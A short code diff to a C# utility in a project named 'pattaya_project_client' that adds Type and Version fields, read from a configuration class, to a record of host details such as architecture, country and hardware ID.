@@ -45,7 +45,9 @@ namespace pattaya_project_client.Utils
                 Integrity = integrity,
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Country = RegionInfo.CurrentRegion.TwoLetterISORegionName,
-                HWID = GetHardwareId()
+                HWID = GetHardwareId(),
+                Type = Config.Type,
+                Version = Config.Version
             };
 
             process.Dispose();
